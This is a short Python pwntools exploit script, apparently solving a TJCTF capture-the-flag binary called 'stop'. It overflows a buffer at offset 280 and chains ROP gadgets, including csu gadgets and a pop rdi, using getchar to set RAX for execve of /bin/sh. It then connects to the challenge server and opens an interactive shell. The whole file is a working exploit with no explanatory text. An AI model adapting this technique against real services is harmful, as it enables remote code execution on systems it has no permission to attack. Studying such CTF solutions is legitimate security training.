#!/usr/bin/python

from pwn import *

elf = ELF("stop")

csu_popRbxRbpR12R13R14R15 = 0x000000000040094a #0x80000 | 0x80001 | 0x1df0 | 0 | 0 | 0 to call _fini
binsh = 0x400a1a
offset = 280
poprdi = 0x0000000000400953
syscall = 0x00000000004008e5
ret = 0x000000000040056e
popRsiR15 = 0x0000000000400951
getchar = elf.plt["getchar"]
csu_MovRdxR15 = 0x0000000000400930


payload = "M"*(280) + p64(getchar)
payload += p64(csu_popRbxRbpR12R13R14R15) + p64(0x80000) + p64(0x80001) + p64(0x1df0) + p64(0)*3
payload += p64(csu_MovRdxR15) + p64(0)*7
payload += p64(poprdi) + p64(binsh) + p64(syscall)



#p = process("./stop")
p = remote("p1.tjctf.org", 8001)

print p.recvuntil("Which letter? ")

p.sendline("M")

print p.recvuntil("Category? ")

p.sendline(payload)
p.sendline(";") #this is here to set RAX to 0x3b (execve)


p.interactive()
